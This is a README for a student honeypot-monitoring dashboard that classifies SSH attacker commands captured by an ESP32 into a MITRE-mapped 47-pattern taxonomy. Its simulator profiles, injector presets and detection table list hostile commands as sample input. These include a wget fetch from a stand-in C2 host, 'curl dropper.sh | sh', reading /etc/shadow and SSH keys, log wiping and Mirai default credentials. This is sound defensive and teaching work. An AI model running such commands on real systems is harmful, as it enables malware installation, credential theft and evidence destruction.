# 🛡️ Winnie-SOC — Live ESP32 IoT Honeypot Cyber SOC Dashboard

**Course:** BCSE410L – Cyber Security Project  
**Team:** VIT Vellore  
**Status:** ✅ Live & Operational

A real-time **Security Operations Center (SOC) dashboard** for the Winnie distributed ESP32 IoT honeypot. The dashboard captures, classifies, and visualises every SSH login attempt and shell command executed by attackers on the honeypot — live, as they happen — across 19 interactive panels powered by WebSocket streaming.

---

## 📋 Table of Contents

1. [Architecture Overview](#architecture-overview)
2. [Prerequisites](#prerequisites)
3. [Installation](#installation)
4. [Starting the Dashboard](#starting-the-dashboard)
5. [Connecting the ESP32 Hardware](#connecting-the-esp32-hardware)
6. [Using the Dashboard](#using-the-dashboard)
7. [Live Attack Simulator](#live-attack-simulator)
8. [Live Command Injector](#live-command-injector)
9. [REST API Reference](#rest-api-reference)
10. [47-Pattern Attack Taxonomy](#47-pattern-attack-taxonomy)
11. [Dashboard Panels Reference](#dashboard-panels-reference)
12. [Project File Structure](#project-file-structure)
13. [How Data Flows End-to-End](#how-data-flows-end-to-end)
14. [Troubleshooting](#troubleshooting)

---

## Architecture Overview

```
┌──────────────────────────────────────────────────────────────────┐
│                      WINNIE-SOC SYSTEM                           │
│                                                                  │
│   ESP32 Honeypot                Dashboard Server                 │
│   ─────────────    TCP JSON      ─────────────────               │
│   • SSH Server ──────────────▶  • TCP Ingestion (port 5000)     │
│   • Bash Emu.   port 5000        • 47-Pattern Classifier         │
│   • WiFiClient                   • Session Tracker               │
│                                  • MITRE ATT&CK Mapper           │
│                                  • Persistence (JSON)            │
│                                  │                               │
│                                  ▼ WebSocket (port 3000)         │
│                              ┌────────────────────┐             │
│                              │   Browser UI        │             │
│                              │   19 Live Panels    │             │
│                              │   Kill-Chain Funnel │             │
│                              │   MITRE Heatmap     │             │
│                              │   Session Replay    │             │
│                              └────────────────────┘             │
└──────────────────────────────────────────────────────────────────┘
```

---

## Prerequisites

| Requirement | Version | Notes |
|---|---|---|
| **Node.js** | v18+ | `node --version` to check |
| **npm** | v9+ | Bundled with Node.js |
| **ESP32** | Any | Flashed with Winnie firmware |
| **Network** | LAN | ESP32 and PC on same Wi-Fi |

> **No Docker, no Python, no database required.** The dashboard runs entirely on Node.js.

---

## Installation

```bash
# Navigate to the dashboard directory
cd c:\Users\Admin\VIT_Projects\winnie-full\dashboard

# Install dependencies (only express + ws)
npm install
```

That's it. The only two dependencies are:
- `express` — HTTP server & REST API
- `ws` — WebSocket real-time streaming

---

## Starting the Dashboard

```bash
# From the dashboard directory:
npm start

# OR equivalently:
node server/server.js
```

You should see:

```
==========================================================
🛡️  WINNIE-SOC LIVE CYBER SECURITY DASHBOARD IS ONLINE!
🌐  Open UI in Browser:  http://localhost:3000
🔌  ESP32 Telemetry Port: TCP 0.0.0.0:5000
==========================================================

[🚀 Winnie-SOC] TCP Ingestion Server listening on 0.0.0.0:5000
[📡 Ready] Set your ESP32 logging target to <YOUR_PC_IP>:5000
```

Then open **http://localhost:3000** in your browser.

---

## Connecting the ESP32 Hardware

The ESP32 sends events to the dashboard over a raw TCP socket as JSON. Inside the Winnie firmware (`winnie/src/main.cpp`), there is a `sendLogToServer()` function.

### Step 1 — Find your PC's IP address

```powershell
# Run in PowerShell:
Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -like "*Wi-Fi*" }
```

Your Wi-Fi IP is currently: **172.16.67.223**

### Step 2 — Configure the ESP32 firmware

In `winnie/src/main.cpp`, locate the server IP configuration and set it to your PC's IP:

```cpp
// Set this to your PC's Wi-Fi IP address
const char* LOG_SERVER_IP = "172.16.67.223";
const int   LOG_SERVER_PORT = 5000;
```

> **Important:** The ESP32 and your PC must be on the **same Wi-Fi network**.

### Step 3 — Flash & run

Flash the ESP32 using PlatformIO as normal. Once it boots and connects to Wi-Fi, every attacker login and shell command will appear live on the dashboard in real-time.

### What the ESP32 sends

Each event is a compact JSON object over TCP:

```json
{
  "ip": "185.220.101.5",
  "session": 42,
  "command": "cat /etc/passwd"
}
```

For login events:

```json
{
  "ip": "45.154.255.89",
  "session": 43,
  "command": "LOGIN: root / xc3511"
}
```

The dashboard TCP server parses these, runs them through the 47-pattern classifier, and broadcasts the enriched events to all browser tabs via WebSocket instantly.

---

## Using the Dashboard

### Header Toolbar

| Control | Function |
|---|---|
| **ESP32 SENSOR pill** | Shows connection status: `WAITING FOR PACKETS` → `ONLINE (IP)` when receiving real hardware data |
| **TCP INGESTION: PORT 5000** | Confirms the ingestion port is active |
| **SOCKET pill** | WebSocket status — green `CONNECTED` means the browser is receiving live updates |
| **Simulate Wave dropdown** | Choose an attack profile to simulate |
| **▶ Simulate Wave** | Launches the selected attack simulation over real TCP |
| **🔇 Sound button** | Toggles Web Audio API alerts (beep on every event, alarm on CRITICAL) |
| **Clear** | Wipes all events, sessions, and chart data (with confirmation) |
| **Export Audit** | Downloads the full session + event log as `winnie_soc_audit.json` |

---

## Live Attack Simulator

The simulator sends realistic attack waves over a **real TCP socket connection to port 5000** — identical to how the physical ESP32 would send data. This is essential for:

- Testing the dashboard without physical hardware
- Demonstrating the system to faculty during reviews
- Reproducing all 47 attack pattern classes on-demand

### Available Profiles

| Profile Key | Name | What it Simulates | Steps |
|---|---|---|---|
| `mirai_botnet` | **Mirai IoT Botnet Invasion** | root/xc3511 brute-force → recon → `/etc/passwd` theft → `wget mirai.arm7` → log erasure | 9 |
| `credential_stuffing` | **Mass Credential Spraying** | 6 dictionary credential pairs (admin/admin, root/vizxv, etc.) | 6 |
| `recon_scanner` | **Automated Reconnaissance Scan** | pwd, whoami, ls /, ps aux, ifconfig environment fingerprinting | 10 |
| `shadow_exfiltration` | **Shadow Hash Theft & Dropper** | `/etc/shadow` → `.ssh/id_rsa` → `curl dropper.sh \| sh` → cron persistence | 7 |
| `mozi_botnet` | **Mozi P2P Botnet Spreader** | Mozi MIPS payload fetch into `/tmp` | 5 |

### How to trigger via UI
1. Select a profile from the dropdown in the header
2. Click **▶ Simulate Wave**
3. Watch data populate all 19 panels in real-time

### How to trigger via API
```bash
curl -X POST http://localhost:3000/api/simulate \
  -H "Content-Type: application/json" \
  -d '{"profile": "mirai_botnet"}'
```

---

## Live Command Injector

The **⚡ LIVE ATTACK INJECTOR** bar lets you manually inject any command or login event into the pipeline over TCP — useful for testing specific patterns or demonstrating individual attack steps.

### Format

| Event Type | Format | Example |
|---|---|---|
| Shell command | Plain text | `cat /etc/shadow` |
| Login attempt | `LOGIN: <user> / <pass>` | `LOGIN: root / 123456` |
| Malware dropper | wget/curl URL | `wget http://c2.evil.su/bot.arm7` |

### Quick Payload Presets

Click any preset tag to instantly inject and classify it:

| Preset | Pattern Triggered |
|---|---|
| 🔑 Mirai Login (root/xc3511) | P04 — CRITICAL Mirai credential |
| 🔑 Default Admin (admin/admin) | P03 — HIGH IoT hardcoded credential |
| 💻 uname -a | P11 — Kernel fingerprinting |
| 👤 id | P14 — Identity enumeration |
| 📂 cat /etc/passwd | P21 — Password file exfiltration |
| 🚨 cat /etc/shadow | P22 — CRITICAL shadow hash theft |
| ⚡ wget mirai.arm7 | P31+P34 — CRITICAL malware dropper |
| 🛡️ rm /var/log | P38 — CRITICAL log wiping |

---

## REST API Reference

The dashboard exposes a full REST API. All endpoints return JSON.

### `GET /api/stats`
Returns aggregated system statistics including kill-chain counts, top credentials, top IPs, botnet attribution, hardware health, and the full 47-pattern taxonomy.

```bash
curl http://localhost:3000/api/stats
```

**Response includes:**
- `summary.totalSessions` — Total unique attacker sessions
- `summary.totalCommands` — Total events captured
- `summary.activeSessions` — Sessions active in the last 5 minutes
- `summary.maxThreatLevel` — `LOW` | `MEDIUM` | `HIGH` | `CRITICAL`
- `summary.killChainCounts` — Events per kill-chain stage
- `summary.botnetCounts` — Events per botnet family
- `summary.topUsers` / `topPasswords` — Credential frequency
- `summary.topCommands` — Most executed shell commands
- `summary.topIps` — Attacker IPs with geo + threat score
- `summary.dropperUrls` — Intercepted wget/curl URLs
- `summary.sensitiveFiles` — `/etc/passwd`, `/etc/shadow` access attempts
- `summary.hardwareHealth` — ESP32 device metrics
- `patternHits` — Hit count per pattern ID (P01–P47)
- `mitreHits` — Hit count per MITRE tactic (TA0001–TA0011)
- `taxonomy` — Full 47-pattern definitions

---

### `GET /api/events?limit=N`
Returns the last N events (default 100), newest first. Each event is fully classified.

```bash
curl http://localhost:3000/api/events?limit=50
```

**Event object:**
```json
{
  "id": "EVT-1728486712345-123",
  "timestamp": "2026-10-09T15:10:07.827Z",
  "ip": "185.220.101.5",
  "session": 901,
  "command": "cat /etc/shadow",
  "isLogin": false,
  "authDetails": null,
  "killChainStage": "4. Credential Harvesting",
  "threatLevel": "CRITICAL",
  "botnetAttribution": "Mirai Botnet",
  "matchedPatterns": [
    { "id": "P22", "name": "Shadow File Hash Theft (/etc/shadow)", "severity": "CRITICAL", "mitre": "T1003.008" }
  ],
  "mitreTechniques": [
    { "id": "T1003.008", "name": "OS Credential Dumping: /etc/shadow", "tactic": "TA0006" }
  ]
}
```

---

### `GET /api/sessions`
Returns all recorded attacker sessions, newest first.

```bash
curl http://localhost:3000/api/sessions
```

---

### `GET /api/sessions/:id`
Returns detailed session data including all commands and auth attempts.

```bash
curl http://localhost:3000/api/sessions/901
```

---

### `POST /api/simulate`
Launches a simulated attack wave over real TCP.

```bash
curl -X POST http://localhost:3000/api/simulate \
  -H "Content-Type: application/json" \
  -d '{"profile": "shadow_exfiltration"}'
```

Profiles: `mirai_botnet`, `credential_stuffing`, `recon_scanner`, `shadow_exfiltration`, `mozi_botnet`

---

### `POST /api/inject`
Injects a single custom command over TCP (identical path to ESP32 telemetry).

```bash
curl -X POST http://localhost:3000/api/inject \
  -H "Content-Type: application/json" \
  -d '{"command": "cat /etc/shadow", "ip": "1.2.3.4", "session": 99}'
```

---

### `POST /api/clear`
Wipes all events, sessions, and persisted data. Broadcasts `RESET` to all WebSocket clients.

```bash
curl -X POST http://localhost:3000/api/clear
```

---

### `GET /api/export`
Downloads the full audit log as a `.json` file.

```bash
curl http://localhost:3000/api/export -o audit.json
```

---

## 47-Pattern Attack Taxonomy

The classification engine maps every honeypot event to one or more of the **47 defined attack patterns** across 5 categories:

### Category 1 — Credential Brute Force (P01–P10)
| ID | Name | Severity | MITRE |
|---|---|---|---|
| P01 | Default Root Login Attempt | HIGH | T1078.001 |
| P02 | Admin Account Dictionary Attack | MEDIUM | T1110.001 |
| P03 | Common IoT Hardcoded Credentials (admin/admin) | HIGH | T1078.001 |
| P04 | Mirai Known Credential Match (root/xc3511) | **CRITICAL** | T1110.001 |
| P05 | Gafgyt/Qbot Known Credential Match (root/vizxv) | **CRITICAL** | T1110.001 |
| P06 | Empty / Null Password Probe | MEDIUM | T1110.001 |
| P07 | High-Frequency Credential Spraying | HIGH | T1110.003 |
| P08 | Telecom / Router Vendor Default Probe | MEDIUM | T1078.001 |
| P09 | Camera / DVR Appliance Default Probe | MEDIUM | T1078.001 |
| P10 | Anomalous Username Syntax Fuzzing | LOW | T1110.001 |

### Category 2 — Reconnaissance & Fingerprinting (P11–P20)
| ID | Name | Severity | MITRE |
|---|---|---|---|
| P11 | Kernel & Architecture Fingerprinting (uname -a) | LOW | T1082 |
| P12 | Working Directory Discovery (pwd) | LOW | T1083 |
| P13 | Current User Privilege Inspection (whoami) | LOW | T1033 |
| P14 | Detailed Identity Enumeration (id) | MEDIUM | T1033 |
| P15 | Root Filesystem Exploration (ls /) | LOW | T1083 |
| P16 | Root Home Directory Audit (ls /root) | MEDIUM | T1083 |
| P17 | Configuration Directory Audit (ls /etc) | MEDIUM | T1083 |
| P18 | Temporary Directory Staging Recon (ls /tmp) | MEDIUM | T1083 |
| P19 | Interactive Shell Capability Probe (help) | LOW | T1059.004 |
| P20 | Process & Service Inspection (ps / top) | MEDIUM | T1057 |

### Category 3 — Credential Harvesting & Exploitation (P21–P30)
| ID | Name | Severity | MITRE |
|---|---|---|---|
| P21 | Password File Exfiltration (/etc/passwd) | HIGH | T1003.008 |
| P22 | Shadow File Hash Theft (/etc/shadow) | **CRITICAL** | T1003.008 |
| P23 | SSH Private Key Hunt (.ssh/id_rsa) | **CRITICAL** | T1552.004 |
| P24 | Command History Snooping (.bash_history) | HIGH | T1552.003 |
| P25 | BusyBox Shell Escape Probe | HIGH | T1059.004 |
| P26 | Router CGI Script Injection (/cgi-bin) | HIGH | T1190 |
| P27 | Network Interfaces Inspection | MEDIUM | T1016 |
| P28 | Init Script & Daemon Enumeration | MEDIUM | T1082 |
| P29 | System Log Snooping (/var/log) | MEDIUM | T1005 |
| P30 | Service Backup Archive Probing | HIGH | T1005 |

### Category 4 — Post-Exploitation, Staging & Malware (P31–P40)
| ID | Name | Severity | MITRE |
|---|---|---|---|
| P31 | Remote Payload Download via WGET | **CRITICAL** | T1105 |
| P32 | Remote Dropper Fetch via CURL | **CRITICAL** | T1105 |
| P33 | Malicious Shell Script Staging (.sh download) | **CRITICAL** | T1105 |
| P34 | Binary Dropper Staging (bin/elf download) | **CRITICAL** | T1105 |
| P35 | Backdoor File Creation (touch / echo) | MEDIUM | T1059.004 |
| P36 | Hidden Staging Directory Creation (mkdir) | MEDIUM | T1083 |
| P37 | Indicator Removal / Artifact Deletion (rm) | HIGH | T1070.004 |
| P38 | Log Wiping Attempt (rm -rf /var/log) | **CRITICAL** | T1070.002 |
| P39 | Payload Execution via Shell Piping (\| sh) | **CRITICAL** | T1059.004 |
| P40 | Cron Scheduled Persistence Probe | HIGH | T1053.003 |

### Category 5 — Botnet Signatures & Behavioral Anomalies (P41–P47)
| ID | Name | Severity | MITRE |
|---|---|---|---|
| P41 | Mirai Botnet Automated Post-Auth Burst | **CRITICAL** | T1587.001 |
| P42 | Hajime P2P Worm Discovery Footprint | HIGH | T1587.001 |
| P43 | Mozi Botnet DHT Discovery Pattern | HIGH | T1587.001 |
| P44 | Gafgyt / Bashlite Architecture Recon Wave | **CRITICAL** | T1587.001 |
| P45 | Hawkes Temporal Burst Rate Anomaly | HIGH | T1046 |
| P46 | Out-of-Order Kill-Chain Leap (Fast Exploit) | MEDIUM | T1190 |
| P47 | Multi-Session Distributed Reconnaissance | HIGH | T1046 |

---

## Dashboard Panels Reference

| Panel | ID | Description |
|---|---|---|
| **Total Sessions** | METRIC-01 | Cumulative unique attacker session count |
| **Total Commands Logged** | METRIC-02 | All captured shell commands and logins |
| **Active Attackers** | METRIC-03 | Sessions with activity in the last 5 minutes |
| **Threat Index** | METRIC-04 | Max threat level: LOW / MEDIUM / HIGH / CRITICAL |
| **ESP32 Hardware Health** | PANEL-17 | Device, estimated free heap (KB), packets ingested |
| **Live Hacker Terminal** | PANEL-05 | Real-time colour-coded shell command stream |
| **Kill-Chain Funnel** | PANEL-06 | 6-stage Cyber Kill-Chain with event counts & % bars |
| **MITRE ATT&CK Heatmap** | PANEL-07 | 9 tactics × techniques grid lit by live hit counts |
| **Botnet Attribution** | PANEL-15 | Detected botnet families with traffic distribution bars |
| **Event Velocity** | PANEL-12 | Events-per-second sparkline graph (canvas) |
| **Top Usernames** | PANEL-08 | Most attempted login usernames with frequency bars |
| **Top Passwords** | PANEL-09 | Most attempted passwords with frequency bars |
| **Top Commands** | PANEL-10 | Most executed shell command prefixes |
| **Attacker IP Profiler** | PANEL-11 | Source IPs with geo, ASN, and threat score 0–100 |
| **Malware Droppers** | PANEL-13 | Intercepted wget/curl URLs with timestamp and session |
| **Sensitive File Access** | PANEL-14 | `/etc/passwd`, `/etc/shadow`, `.ssh` access attempts |
| **Attack Sessions Explorer** | PANEL-16 | Sortable session table with click-to-replay |
| **Keystroke Replay** | PANEL-18 | Step-by-step animated session playback modal |
| **47-Pattern Taxonomy** | TAXONOMY-47 | Searchable grid of all 47 pattern definitions with live hit counts |

---

## Project File Structure

```
dashboard/
│
├── server/
│   ├── server.js          # Main application server (Express + WebSocket + REST API)
│   ├── tcp_server.js      # TCP ingestion server — receives ESP32 JSON on port 5000
│   ├── classifier.js      # 47-pattern Kill-Chain & MITRE ATT&CK classification engine
│   └── simulator.js       # Synthetic attack simulator (5 real-world IoT botnet profiles)
│
├── public/
│   ├── index.html         # Dashboard HTML — 19 panels, injector bar, replay modal
│   ├── styles.css         # Glassmorphism dark SOC theme with micro-animations
│   └── app.js             # Frontend WebSocket client, all panel renderers, canvas graphs
│
├── data/                  # Auto-created at runtime for persistence
│   ├── events.json        # Rolling window of last 500 classified events
│   └── sessions.json      # All recorded attacker sessions
│
├── test_client.py         # Python test script to simulate raw ESP32 TCP packet
├── package.json           # Node.js project config (express, ws)
└── README.md              # This file
```

---

## How Data Flows End-to-End

```
1. ESP32 WiFiClient / test_client.py / Simulator
   │
   │  TCP JSON: {"ip": "...", "session": 42, "command": "cat /etc/shadow"}
   ▼
2. TcpIngestionServer (port 5000)
   │  Buffers socket data, parses JSON, validates fields
   ▼
3. AttackClassifier.classify()
   │  Matches against 47 patterns
   │  Assigns killChainStage, threatLevel, botnetAttribution
   │  Maps to MITRE ATT&CK tactics and techniques
   ▼
4. processIncomingEvent()
   │  Updates session record (creates if new)
   │  Accumulates patternHits, mitreHits, techniqueHits
   │  Throttled persistence to data/events.json
   ▼
5. broadcast() via WebSocket
   │  Sends enriched event + updated stats to ALL connected browsers
   ▼
6. Browser app.js handleSocketMessage()
   │  Updates all 19 panels simultaneously
   │  Appends line to live terminal
   │  Plays audio alert (if sound enabled)
   │  Redraws velocity canvas
   ▼
7. Analyst sees real-time classified threat intelligence
```

---

## Troubleshooting

### Dashboard won't start — "EADDRINUSE port 3000"
Another process is using port 3000 or 5000. Kill it:
```powershell
Stop-Process -Id (Get-NetTCPConnection -LocalPort 3000 | Select -First 1 -Exp OwningProcess) -Force
Stop-Process -Id (Get-NetTCPConnection -LocalPort 5000 | Select -First 1 -Exp OwningProcess) -Force
```

### WebSocket shows "RECONNECTING..."
The server is not running. Run `npm start` from the `dashboard/` directory.

### ESP32 is connected but no data appears
1. Confirm ESP32 and PC are on **the same Wi-Fi network**
2. Verify the IP in `main.cpp` matches your current Wi-Fi IP (`172.16.67.223`)
3. Check Windows Firewall is not blocking port 5000:
   ```powershell
   New-NetFirewallRule -DisplayName "Winnie TCP 5000" -Direction Inbound -Protocol TCP -LocalPort 5000 -Action Allow
   ```
4. Use the **test_client.py** to confirm the TCP server is reachable from another machine

### Testing TCP ingestion manually
```bash
# Python test client (already included):
python test_client.py

# Or use netcat:
echo '{"ip":"1.2.3.4","session":1,"command":"cat /etc/passwd"}' | nc localhost 5000

# Or PowerShell:
$tcp = New-Object Net.Sockets.TcpClient("localhost", 5000)
$stream = $tcp.GetStream()
$bytes = [Text.Encoding]::UTF8.GetBytes('{"ip":"1.2.3.4","session":1,"command":"uname -a"}')
$stream.Write($bytes, 0, $bytes.Length)
$tcp.Close()
```

### Clearing stale data between demo runs
Click **Clear** in the dashboard header (or `curl -X POST http://localhost:3000/api/clear`). This resets all counters and the UI without restarting the server.

---

## Quick Reference Card

```
┌─────────────────────────────────────────────────────┐
│              WINNIE-SOC QUICK REFERENCE             │
├─────────────────────────────────────────────────────┤
│  Dashboard URL   │  http://localhost:3000           │
│  TCP Ingest Port │  0.0.0.0:5000                   │
│  WebSocket       │  ws://localhost:3000/ws          │
│  Your PC IP      │  172.16.67.223 (Wi-Fi)          │
├─────────────────────────────────────────────────────┤
│  npm start       │  Start the server               │
│  /api/stats      │  GET — Full analytics snapshot  │
│  /api/events     │  GET — Last N classified events │
│  /api/sessions   │  GET — All attacker sessions    │
│  /api/simulate   │  POST — Launch attack wave      │
│  /api/inject     │  POST — Inject custom command   │
│  /api/clear      │  POST — Reset all data          │
│  /api/export     │  GET — Download audit log       │
└─────────────────────────────────────────────────────┘
```

---

*Winnie-SOC Dashboard — Built for BCSE410L Cyber Security Project, VIT Vellore*
